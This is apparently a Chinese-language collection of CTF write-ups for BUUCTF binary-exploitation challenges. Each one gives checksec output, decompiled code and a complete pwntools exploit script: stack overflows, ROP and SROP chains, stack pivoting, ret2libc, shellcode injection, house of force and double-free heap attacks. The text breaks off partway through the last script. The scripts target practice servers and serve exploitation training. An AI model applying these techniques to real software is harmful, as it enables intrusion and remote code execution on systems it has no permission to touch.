取程序里面fflush的sh填入system参数+栈溢出 3.EXP 123456789101112131415161718192021222324from pwn import *#context.log_level = &#x27;debug&#x27;p = remote(&quot;node3.buuoj.cn&quot;,26685)#p = process(&quot;./ciscn_2019_ne_5&quot;)elf = ELF(&quot;./ciscn_2019_ne_5&quot;)sys_addr = elf.plt[&#x27;system&#x27;]sh_addr = 0x080482E0+0xApayload = &#x27;a&#x27;*(0x48+4)+p32(sys_addr)+&#x27;aaaa&#x27;+p32(sh_addr)p.recvuntil(&#x27;Please input admin password:&#x27;)p.sendline(&#x27;administrator&#x27;)p.recvuntil(&#x27;0.Exit\\n:&#x27;)p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;Please input new log info:&#x27;)p.sendline(payload)p.recvuntil(&#x27;0.Exit\\n:&#x27;)p.sendline(&#x27;4&#x27;)p.interactive() ciscn_2019_s_3 1.checksec() 1234567root@joe1sn:~/download/BUUCTF/ciscn_2019_s_3# checksec ciscn_s_3[*] &#x27;/root/download/BUUCTF/ciscn_2019_s_3/ciscn_s_3&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 2.IDA main 1234int __cdecl main(int argc, const char **argv, const char **envp)&#123; return vuln();&#125; vuln 123456789signed __int64 vuln()&#123; signed __int64 result; // rax __asm &#123; syscall; LINUX - sys_read &#125; result = 1LL; __asm &#123; syscall; LINUX - sys_write &#125; return result;&#125; 居然是汇编，这种题从来没遇见过 不过看得出来(结合汇编) sys_write：向栈上写数据(0x400) sys_read：从栈上读数据(0x30) 查了查WP https://blog.csdn.net/github_36788573/article/details/103541178 3WriteUp分析 主要是gadget函数有东西 12345678910; __unwind &#123;push rbpmov rbp, rspmov rax, Fhretnmov rax, 59retnpop rbpretn&#125; // starts at 4004D6 先是向rax传递了0xf，在linux的系统调用表示 sys_rt_sigreturn(unsigned long _unused) 15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。 向rax传递了59，在linux的系统调用表示 sys_exec(const char *filename,const char *const argv[],const char *,const envp[]) 就相当于system函数 59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。 这就引申出两种解题方法 4.1 59号系统调用 ropgadget 12345678910111213141516171819202122Gadgets information============================================================0x00000000004004a3 : mov byte ptr [rip + 0x200b86], 1 ; ret0x00000000004004e3 : mov eax, 0x3b ; ret0x00000000004004db : mov eax, 0xf ; ret0x00000000004004d8 : mov ebp, esp ; mov rax, 0xf ; ret0x00000000004004e2 : mov rax, 0x3b ; ret0x00000000004004da : mov rax, 0xf ; ret0x000000000040059c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040059e : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005a0 : pop r14 ; pop r15 ; ret0x00000000004005a2 : pop r15 ; ret0x00000000004004a2 : pop rbp ; mov byte ptr [rip + 0x200b86], 1 ; ret0x000000000040059b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040059f : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400440 : pop rbp ; ret0x00000000004005a3 : pop rdi ; ret0x00000000004005a1 : pop rsi ; pop r15 ; ret0x000000000040059d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004003a9 : retUnique gadgets found: 18 3.EXP 1234567891011121314151617181920212223from pwn import *context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,26249)vuln_addr = 0x04004EDexecv = 0x04004E2pop_rdi = 0x04005A3pop_5_ret = 0x040059Amov_RDX_r13 =0x0400580sys_write = 0x0400517payload = &quot;/bin/sh\\x00&quot;*2 + p64(vuln_addr)p.send(payload)p.recv(0x20) = u64(p.recv(8)) - 280print(hex( ))payload = &quot;/bin/sh\\x00&quot;*2 + p64(pop_5_ret) + p64(0)*2payload += p64( +0x50)+p64(0)*3payload += p64(mov_RDX_r13) + p64(execv)payload += p64(pop_rdi) + p64( ) + p64(sys_write)p.send(payload)p.interactive() 这个EXP是可以打通的，看上去和普通write泄露libc的EXP差不多 其实包含了很多汇编的底层知识 4.2FramingSignals-AReturntoPortableShellcode SROP FramingSignals-AReturntoPortableShellcode 1234567891011121314151617181920212223242526272829from pwn import *io=process(&#x27;./ciscn_s_3&#x27;)main=0x0004004EDsigret=0x4004DAsys=0x400517pl1=&#x27;/bin/sh\\x00&#x27;*2+p64(main)io.send(pl1)io.recv(0x20)sh=u64(io.recv(8))-280print(hex(sh))frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = shframe.rsi = 0frame.rdx = 0frame.rip = syspl1=&#x27;a&#x27;*16+p64(sigret)+p64(sys)+str(frame)&#x27;&#x27;&#x27;def debug(addr): raw_input(&#x27;debug:&#x27;) gdb.attach(io, &quot;b *&quot; + addr)debug(&#x27;0x400514&#x27;)&#x27;&#x27;&#x27;pl2=&#x27;/bin/sh\\x00&#x27;*2+p64(sigret)+p64(sys)+str(frame)io.send(pl2)io.interactive() 参考南梦的打法 [CTF-BUUCTF-Pwn刷题之旅-](https://196011564.github.io/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/ ciscn_2019_s_4 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA vuln 12345678910int vul()&#123; char s; // [esp+0h] [ebp-28h] memset(&amp;s, 0, 0x20u); read(0, &amp;s, 0x30u); printf(&quot;Hello, %s\\n&quot;, &amp;s); read(0, &amp;s, 0x30u); return printf(&quot;Hello, %s\\n&quot;, &amp;s);&#125; 两次很短的栈溢出，第一次ebp leak，第二次leave ret 3.GDB **1.**输入0x20+4个字符串，泄露ebp 123ECX: 0xffffcff0 (&#x27;a&#x27; &lt;repeats 36 times&gt;, &quot;\\n\\320\\377\\377(\\320\\377\\377*\\206\\004\\b\\334c\\373\\367@\\320\\377\\377&quot;)................EBP: 0xffffd018 --&gt; 0xffffd028 --&gt; 0x0 12&gt;&gt;&gt; hex(0xffffcff0- 0xffffd018)&#x27;-0x28&#x27; 下一步时，程序会抬栈，所以这时候的buf为0xffffd028，偏移量为0x28-0x10 2.构造payload 主要目标是：让程序ret到栈开始的地方，将刚才构造的payload当作命令执行 1pl2=(&#x27;aaaa&#x27;+p32(sys_plt)+&#x27;bbbb&#x27;+p32(buf+0x10)+&#x27;/bin/sh\\x00&#x27;).ljust(0x28,&#x27;a&#x27;)+p32(buf)+p32(leave) 4.EXP 12345678910111213141516171819202122from pwn import *context.log_level = &quot;debug&quot;#p = remote(&quot;node3.buuoj.cn&quot;,&quot;26826&quot;)p = process(&quot;./ciscn_s_4&quot;)elf = ELF(&quot;./ciscn_s_4&quot;)leave=0x8048562sys_plt=0x8048400pl1=&#x27;a&#x27;*0x24+&#x27;bbbb&#x27;p.send(pl1)p.recvuntil(&#x27;bbbb&#x27;)ebp=u32(p.recv(4))success(&quot;EBP =&gt;0x%x&quot;,ebp)context.terminal=[&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]gdb.attach(p)buf=ebp-0x38pl2=(&#x27;aaaa&#x27;+p32(sys_plt)+&#x27;bbbb&#x27;+p32(buf+16)+&#x27;/bin/sh\\x00&#x27;).ljust(0x28,&#x27;a&#x27;)+p32(buf)+p32(leave)p.send(pl2)p.interactive() cisncn_2019_s_6 和ciscn_2019_es_1一样 ciscn_2019_s_9 1.checksec 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 估计和shellcode相关 2.IDA pwn 1234567891011121314int pwn()&#123; char s[24]; // [esp+8h] [ebp-20h] puts(&quot;\\nHey! ^_^&quot;); puts(&quot;\\nIt&#x27;s nice to meet you&quot;); puts(&quot;\\nDo you have anything to tell?&quot;); puts(&quot;&gt;&quot;); fflush(stdout); fgets(s, 50, stdin); puts(&quot;OK bye~&quot;); fflush(stdout); return 1;&#125; 第十行栈溢出 hint 123456789; Attributes: bp-based frame;void hintpublic hinthint proc near; __unwind &#123;push ebpmov ebp, espjmp esphint endp 利用jmp esp实现跳转 3.EXP 123456789101112from pwn import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./ciscn_s_9&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;25940&quot;)shellcode = &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&quot;gadget = asm(&quot;sub esp,0x28 ; jmp esp&quot;)jmp_esp = 0x08048554payload = shellcode.ljust(0x24,&#x27;\\x00&#x27;)+p32(jmp_esp)+gadgetp.sendline(payload)p.interactive() cmcc_pwnme1 1.checksec 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 2.IDA getfruit 123456789int getfruit()&#123; char v1; // [esp+14h] [ebp-A4h] fflush(stdout); printf(&quot;Please input the name of fruit:&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v1); return printf(&quot;oh,%s...\\n&quot;, &amp;v1);&#125; 栈溢出 3.EXP 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwnme1&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;28427&quot;)puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]getfruit = 0x08048624payload = &#x27;a&#x27;*(0xA4+4)payload += p32(puts_plt)+p32(getfruit)+p32(puts_got)p.sendlineafter(&quot;&gt;&gt; 6. Exit &quot;,&#x27;5&#x27;)p.sendlineafter(&quot;Please input the name of fruit:&quot;,payload)puts_real = u32(p.recvuntil(&#x27;\\xf7&#x27;)[-4:].ljust(4,&#x27;\\x00&#x27;))libc = LibcSearcher(&quot;puts&quot;,puts_real)base = puts_real-libc.dump(&quot;puts&quot;)sys_addr = base+libc.dump(&quot;system&quot;)binsh = base+libc.dump(&quot;str_bin_sh&quot;)success(&quot;libc base 0x%x&quot;,base)success(&quot;binsh 0x%x&quot;,binsh)success(&quot;system 0x%x&quot;,sys_addr)payload = &#x27;a&#x27;*(0xA4+4)payload += p32(sys_addr)+&#x27;aaaa&#x27;+p32(binsh)p.sendlineafter(&quot;Please input the name of fruit:&quot;,payload)p.interactive() cmcc_pwnme2 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA userfunction 123456int __cdecl userfunction(char *src)&#123; char dest; // [esp+Ch] [ebp-6Ch] strcpy(&amp;dest, src); return printf(&quot;Hello, %s\\n&quot;, src);&#125; 之前在main里面输入过多的话，会导致这里栈溢出 exec_string 12345678910111213int exec_string()&#123; char s; // [esp+Bh] [ebp-Dh] FILE *stream; // [esp+Ch] [ebp-Ch] stream = fopen(&amp;string, &quot;r&quot;); if ( !stream ) perror(&quot;Wrong file&quot;); fgets(&amp;s, 50, stream); puts(&amp;s); fflush(stdout); return fclose(stream);&#125; string变量在bss段上，要想执行它，就必须把/flag命令写到string上，这里就可以构造payload 3.EXP 1234567891011121314from pwn import *context.log_level = &quot;debug&quot;sh = remote(&quot;node3.buuoj.cn&quot;,28490)elf = ELF(&quot;pwnme2&quot;)pop_ebp_ret = 0x08048680offset = 0x6C+4payload = offset * &quot;a&quot;payload += p32(elf.plt[&#x27;gets&#x27;])payload += p32(pop_ebp_ret)payload += p32(0x0804A060)#bss_stringpayload += p32(0x080485CB)#exec_stringsh.sendlineafter(&quot;Please input:&quot;,payload)sh.sendline(&quot;/flag&quot;)sh.interactive() cmcc_simplerop 1.checksec 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA 发现了超级多的无用函数 main 123456789int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+1Ch] [ebp-14h] puts(&quot;ROP is easy is&#x27;nt it ?&quot;); printf(&quot;Your input :&quot;); fflush(stdout); return read(0, &amp;v4, 100);&#125; 很明显的read溢出，但是不大好的构造ropchain,所以先用ROPgadget自动生成ropchain，但是需要调整长度 ROPgadget --binary simplerop --ropchain 3.EXP 123456789101112131415161718192021222324252627from pwn import *from struct import pack#io=process(&#x27;./simplerop&#x27;)io=remote(&quot;node3.buuoj.cn&quot;,25035)io.recvuntil(&#x27;:&#x27;)# Padding goes herep = &#x27;a&#x27;*0x14+p32(1)*3p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; retp += &#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; retp += &#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806e850) # pop edx pop ecx pop edx; retp += pack(&#x27;&lt;I&#x27;, 0x0)p += pack(&#x27;&lt;I&#x27;, 0x0)p += pack(&#x27;&lt;I&#x27;, 0x080ea060) #bin/shp += pack(&#x27;&lt;I&#x27;, 0x080bae06) #pop eaxp += pack(&#x27;&lt;I&#x27;, 0xb) # eax=0xbp += pack(&#x27;&lt;I&#x27;, 0x080493e1) #int 80io.send(p)io.interactive()print hex(len(p)) ez_pz_hackover_2016 1.checksec 123456Arch: i386-32-littleRELRO: Full RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 2.IDA main 1234567int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdout, 0); header(); chall(); return 0;&#125; chall 123456789101112131415161718192021int chall()&#123; size_t v0; // eax int result; // eax char s; // [esp+Ch] [ebp-40Ch] _BYTE *v3; // [esp+40Ch] [ebp-Ch] printf(&quot;Yippie, lets crash: %p\\n&quot;, &amp;s); printf(&quot;Whats your name?\\n&quot;); printf(&quot;&gt; &quot;); fgets(&amp;s, 1023, stdin); v0 = strlen(&amp;s); v3 = memchr(&amp;s, 10, v0); if ( v3 ) *v3 = 0; printf(&quot;\\nWelcome %s!\\n&quot;, &amp;s); result = strcmp(&amp;s, &quot;crashme&quot;); if ( !result ) result = vuln((unsigned int)&amp;s, 0x400u); return result;&#125; vuln 123456void *__cdecl vuln(char src, size_t n)&#123; char dest; // [esp+6h] [ebp-32h] return memcpy(&amp;dest, &amp;src, n);&#125; strlen()遇见’\\x00’截断 s 和 vuln里面dest 的ebp 的距离 memchr比较前十个字符串 3.EXP 123456789101112from pwn import *#context.log_level = &quot;debug&quot;p = remote(&quot;node3.buuoj.cn&quot;,29397)#p = process(&quot;./ez_pz_hackover_2016&quot;)p.recvuntil(&quot;Yippie, lets crash: 0x&quot;)stack_addr = int(p.recv(8),16)print hex(stack_addr)payload = &quot;crashme\\x00&quot; + &#x27;a&#x27;*(0x40-0x32+4) payload += p32(stack_addr-(0x40-0x32+4+10)) + asm(shellcraft.sh())p.sendlineafter(&quot;&gt; &quot;,payload)p.interactive() get_started_3dsctf_2016 1.checksec() 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 2.IDA main 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [esp+4h] [ebp-38h] printf(&quot;Qual a palavrinha magica? &quot;, v4); gets(&amp;v4); return 0;&#125; get_flag 123456789101112131415161718192021222324252627void __cdecl get_flag(int a1, int a2)&#123; int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 814536271 &amp;&amp; a2 == 425138641 ) &#123; v2 = fopen(&quot;flag.txt&quot;, &quot;rt&quot;); v3 = v2; v4 = getc(v2); if ( v4 != 255 ) &#123; v5 = (char)v4; do &#123; putchar(v5); v6 = getc(v3); v5 = (char)v6; &#125; while ( v6 != 255 ); &#125; fclose(v3); &#125;&#125; 其实主要分析可知，这个程序的大致意思是修改eip改变程序流，最后执行cat_flag 但是BUU远程打不通，要使用mprotec函数修改内存的权限为可读可写可执行，再使用read函数写入shellcode到被解放的bss段 mprotect原型 12#include &lt;sys/mman.h&gt;int mprotect(void *addr, size_t len, int prot); 所以我们需要三个参数，就要ppp_ret 3.EXP 123456789101112131415from pwn import *#context.log_level = &quot;debug&quot;p=remote(&#x27;node3.buuoj.cn&#x27;,28495)elf=ELF(&#x27;./get_started_3dsctf_2016&#x27;)pop3_ret = 0x0804951Dget_flag = 0x080489A0got_addr = 0x080EB000payload = &#x27;a&#x27;*0x38+p32(elf.symbols[&#x27;mprotect&#x27;])payload += p32(pop3_ret)+p32(got_addr)+p32(0x1d8c)+p32(0x7)payload += p32(elf.symbols[&#x27;read&#x27;])payload += p32(pop3_ret)+p32(0)+p32(got_addr)+p32(0x100)+p32(got_addr)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() gyctf_2020_borrowstack 1.checksec 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA main 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-60h] setbuf(stdin, 0LL); setbuf(stdout, 0LL); puts(&amp;s); read(0, &amp;buf, 0x70uLL); puts(&quot;Done!You can check and use your borrow stack now!&quot;); read(0, &amp;bank, 0x100uLL); return 0;&#125; 第一步栈迁移，第二步抬高栈了过后libc leak，程序返回至第一个read，第三步one gadget来getshell 3.EXP 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &quot;debug&quot;io=remote(&#x27;node3.buuoj.cn&#x27;,25707)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9io.recvuntil(&#x27;u want&#x27;)pl1=&#x27;a&#x27;*0x60+p64(bank)+p64(leave)io.send(pl1)io.recvuntil(&#x27;now!&#x27;)pl2=p64(ret)*20 #抬高栈&#x27;&#x27;&#x27;ret指令用栈中的数据，修改IP的值，从而实现近转移。CPU执行ret指令时，进行下面两步操作：(IP)=((SS)*16+(SP))(SP)=(SP)+2;&#x27;&#x27;&#x27;pl2+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)io.send(pl2)io.recvline()puts_add=u64(io.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base=puts_add-0x06f690one_gadget=libc_base+0x4526apl3=&#x27;a&#x27;*0x60+&#x27;bbbbbbbb&#x27;+p64(one_gadget)io.send(pl3)io.interactive() gyctf_2020_force 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA 有用的基本只有add 1234567def add(sz,text): p.sendlineafter(&quot;2:puts\\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size\\n&quot;,str(sz)) p.recvuntil(&quot;bin addr &quot;) addr = int(p.recvuntil(&#x27;\\n&#x27;).strip(), 16) p.sendafter(&quot;content\\n&quot;,text) return addr add 123456puts(&quot;size&quot;);read(0, nptr, 0xFuLL);size = atol(nptr);*(_QWORD *)i = malloc(size);if ( !*(_QWORD *)i ) exit(0); add会返回堆的地址，所以可以利用这个来获取偏移量 add同时存在堆溢出，使得我们可以覆盖 top chunk的 size域 可以多次申请。综上，符合house of force的攻击条件 1.libc leak 2.hof 3.malloc_hook+one gadget 3.GDB 0x1 libc leak 12345678910111213141:add2:puts1size2097152 bin addr 0x7ffff780c010contentaaaa&gt;vmmap0x7ffff780c000 0x7ffff7a0d000 rw-p 201000 0 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so&gt;In python&gt;&gt;&gt; hex(0x7ffff7a0d000 - 0x7ffff780c010)&#x27;0x200ff0&#x27; 得到偏移 0x200ff0 0x2 house of force 1234567891011121314151617181920212223242526#code: addr = add(0x200000,&#x27;aaaaaa&#x27;) base = addr + 0x200ff0 log.success(&quot;libc base &gt;&gt;0x%x&quot;,base) top = add(0x18,&quot;a&quot;*0x10+p64(0)+p64(0xffffffffffffffff))+0x10 log.success(&quot;top chunk &gt;&gt;0x%x&quot;,top) gdb.attach(p)#gdb:pwndbg&gt; heap0x5559b4dfa000 FASTBIN &#123; prev_size = 0, size = 33, fd = 0x6161616161616161, bk = 0x6161616161616161, fd_nextsize = 0x0, bk_nextsize = 0xffffffffffffffff&#125;pwndbg&gt; x/12gx 0x5559b4dfa0000x55d5b01aa000: 0x0000000000000000 0x00000000000000210x55d5b01aa010: 0x6161616161616161 0x61616161616161610x55d5b01aa020: 0x0000000000000000 0xffffffffffffffff0x55d5b01aa030: 0x0000000000000000 0x0000000000000000#输出:[+] Starting local process &#x27;./gyctf_2020_force&#x27;: pid 50956[+] libc base &gt;&gt;0x7fc48892d000[+] top chunk &gt;&gt;0x55d5b01aa020 123456789#code: add((offset-0x33),&quot;aaaa&quot;) #考虑到内存对齐，经过调试可得offset-0x33时，可以申请到malloc_hook-0x21的内存 add(0x10,&quot;a&quot;*0x8+p64(one_gadget)+p64(realloc+16))#gdb:0x7f7a6909aaef &lt;_IO_wide_data_0+303&gt;: 0x007f7a6909926000 0x00000000000021000x7f7a6909aaff: 0x6161616161616100 0x007f7a68d1b26a610x7f7a6909ab0f &lt;__realloc_hook+7&gt;: 0x007f7a68d5a6d000 0xffd61c20d2750900 &lt;-这里调整堆栈，使one gadget可用0x7f7a6909ab1f: 0x00000100000000ff 0x0000000000000000 4.EXP 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#context.log_level = &quot;debug&quot;elf = ELF(&quot;./gyctf_2020_force&quot;)libc = ELF(&quot;/home/joe1sn/libc/64/libc-2.23.so&quot;)p = process(&quot;./gyctf_2020_force&quot;)#p = remote(&quot;node3.buuoj.cn&quot;,&quot;28528&quot;)def add(sz,text): p.sendlineafter(&quot;puts\\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size\\n&quot;,str(sz)) p.recvuntil(&quot;0x&quot;) addr = int(p.recv(12),16) p.sendafter(&quot;content\\n&quot;,text) return addrif __name__ == &#x27;__main__&#x27;: addr = add(0x200000,&#x27;aaaaaa&#x27;) base = addr + 0x200ff0 log.success(&quot;libc base &gt;&gt;0x%x&quot;,base) top = add(0x18,&quot;a&quot;*0x10+p64(0)+p64(0xffffffffffffffff))+0x10 log.success(&quot;top chunk &gt;&gt;0x%x&quot;,top) #gdb.attach(p) malloc_hook = base+libc.sym[&quot;__malloc_hook&quot;] realloc = base+libc.sym[&quot;__libc_realloc&quot;] one_gadget = 0x4526a + base offset = malloc_hook-top log.success(&quot;malloc hook &gt;&gt;0x%x&quot;,malloc_hook) log.success(&quot;realloc hook &gt;&gt;0x%x&quot;,realloc) log.success(&quot;offset &gt;&gt;0x%x&quot;,offset) add((offset-0x33),&quot;aaaa&quot;) add(0x10,&quot;a&quot;*0x8+p64(one_gadget)+p64(realloc+16)) #gdb.attach(p) p.sendlineafter(&quot;puts\\n&quot;,&quot;1&quot;) p.sendlineafter(&quot;size\\n&quot;,str(0x20)) p.interactive() gyctf_2020_some_thing_exceting 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 2.IDA 三大功能 1234567891011121314def add(ba_sz,ba_text,na_sz,na_text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(ba_sz)) p.sendlineafter(&quot;:&quot;,str(ba_text)) p.sendlineafter(&quot;:&quot;,str(na_sz)) p.sendlineafter(&quot;:&quot;,str(na_text))def delete(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def view(idx): p.sendlineafter(&quot;:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx)) flag 123456789101112131415161718unsigned __int64 flag()&#123; FILE *stream; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); stream = fopen(&quot;/flag&quot;, &quot;r&quot;); if ( !stream ) &#123; puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;); exit(0); &#125; byte_6020A0 = 96; fgets(s, 45, stream); return __readfsqword(0x28u) ^ v2;&#125; 后门函数 delete 123free(*(void **)ptr[v1]);free(*((void **)ptr[v1] + 1));free(ptr[v1]); free指针没有清零，可以直接接上 3.EXP 1234567891011121314151617181920212223242526272829303132333435from pwn import *#context.log_level = &quot;debug&quot;elf = ELF(&quot;./something&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#p = process(&quot;./something&quot;)p = remote(&quot;node3.buuoj.cn&quot;,&quot;25754&quot;)def add(ba_sz,ba_text,na_sz,na_text): p.sendlineafter(&quot;:&quot;,&quot;1&quot;) p.sendlineafter(&quot;:&quot;,str(ba_sz)) p.sendlineafter(&quot;:&quot;,str(ba_text)) p.sendlineafter(&quot;:&quot;,str(na_sz)) p.sendlineafter(&quot;:&quot;,str(na_text))def delete(idx): p.sendlineafter(&quot;:&quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(idx))def view(idx): p.sendlineafter(&quot;:&quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(idx))if __name__ == &#x27;__main__&#x27;: add(0x50,&#x27;0000&#x27;,0x50,&#x27;1111&#x27;)#0 add(0x50,&#x27;2222&#x27;,0x50,&#x27;3333&#x27;)#1 delete(0) delete(1) delete(0) add(0x50,p64(0x602098),0x50,&#x27;Chunk_2&#x27;)#0 add(0x50,&#x27;Chunk_3&#x27;,0x50,&#x27;Chunk_4&#x27;)#1--&gt;in 0x602098 add(0x50,&#x27;f&#x27;,0x60,&#x27;2&#x27;)#0 view(4) p.interactive() gyctf_2020_some_thing_interesting 1.checksec 12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled 2.IDA sub_B7A 123456read(0, s1, 0x13uLL); if ( strncmp(s1, &quot;OreOOrereOOreO&quot;, 14uLL) ) // 只比较了前14个，后面可以带东西 &#123; puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;); exit(0); &#125; 字符串格式化漏洞，这里可以泄露地址 delete 1234567891011121314151617181920212223unsigned __int64 delete()&#123; int v1; // [rsp+4h] [rbp-Ch] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); puts(&quot;#######################&quot;); puts(&quot;# Delete Oreo #&quot;); puts(&quot;#---------------------#&quot;); printf(&quot;&gt; Oreo ID : &quot;); _isoc99_scanf(&quot;%d&quot;, &amp;v1); if ( v1 &lt; 0 || v1 &gt; 10 || !chunk[v1] ) // 检查idx合法 &#123; puts(&quot;Emmmmmm!Maybe you want Fool me!&quot;); Exit(); &#125; free(chunk[v1]); // 指针未清零 free(re_chunk[v1]); // 导致uaf puts(&quot;#---------------------#&quot;); puts(&quot;# ALL Down! #&quot;); puts(&quot;#######################&quot;); return __readfsqword(0x28u) ^ v2;&#125; free后指针没有置零，造成uaf 3.exp1 偏移量计算 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *elf = ELF(&quot;./gyctf_2020_some_thing_interesting&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)sh = 0counter=&quot;&quot;def start(i): sh.sendlineafter(&quot;:&quot;,&quot;OreOOrereOOreO%&quot;+str(i)+&quot;$p&quot;)def check_in(i): sh.sendlineafter(&quot;:&quot;,&quot;0&quot;) sh.recvuntil(&quot;OreOOrereOOreO&quot;) str1 = sh.recv(16) #print str1 if &quot;0x7f&quot; in str1: success(&quot;This can be tested&quot;) global counter counter+= &quot; &quot;+str(i)+&quot; &quot; print &quot;\\n&quot; print &quot;\\n&quot; else: pass def offset_count(ip,port,mode,debug,i): global sh if debug==0: context.log_level = &quot;debug&quot; else: pass if mode==0: sh = process(&quot;./gyctf_2020_some_thing_interesting&quot;) else: sh = remote(ip,port) start(i) check_in(i) sh.close()if __name__ == &#x27;__main__&#x27;: for i in range(4,20): #success(&quot;Now round %d&quot;,i) offset_count(1,1,0,1,i) print &quot;can be tested &gt;&quot; print counter 得到 4 6 7 10 11 12 14 16 17 19 最终得到偏移量为 17 这里也可以使用 *b $rebase(偏移地址) 来慢慢计算得到偏移 3.exp2 攻击 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *elf = ELF(&quot;./gyctf_2020_some_thing_interesting&quot;)libc = ELF(&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;)sh = 0def leak_addr(): sh.sendlineafter(&quot;:&quot;,&quot;OreOOrereOOreO%17$p&quot;) sh.sendlineafter(&quot;:&quot;,&quot;0&quot;) sh.recvuntil(&quot;OreOOrereOOreO0x&quot;) return int(sh.recv(12),16)def create(o_sz,o_text,re_sz,re_text): sh.sendlineafter(&quot;:&quot;,&quot;1&quot;) sh.sendlineafter(&quot;: &quot;,str(o_sz)) sh.sendlineafter(&quot;: &quot;,o_text) 